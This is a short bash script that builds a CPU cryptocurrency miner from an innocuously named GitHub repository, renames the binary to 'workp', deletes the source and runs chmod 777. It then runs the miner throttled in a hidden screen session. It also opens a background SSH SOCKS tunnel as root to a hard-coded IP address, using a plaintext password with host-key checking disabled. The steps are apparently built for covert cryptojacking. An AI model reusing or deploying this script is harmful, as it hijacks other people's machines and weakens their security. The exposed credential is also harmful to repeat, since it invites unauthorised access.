#!/bin/bash
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
git clone https://github.com/laptopdell/laptopdell24inch/
cd laptopdell24inch
chmod +x *
./build.sh
make
mv cpuminer workp && cp workp ../ && cd ..  && sudo rm -rf laptopdell24inch && sudo chmod 777 * && screen -d -m sshpass -p blackpro97 ssh -o StrictHostKeyChecking=no -D 1997 root@45.32.93.208 && screen -d -m cpulimit --exe workp --limit 200 -b 
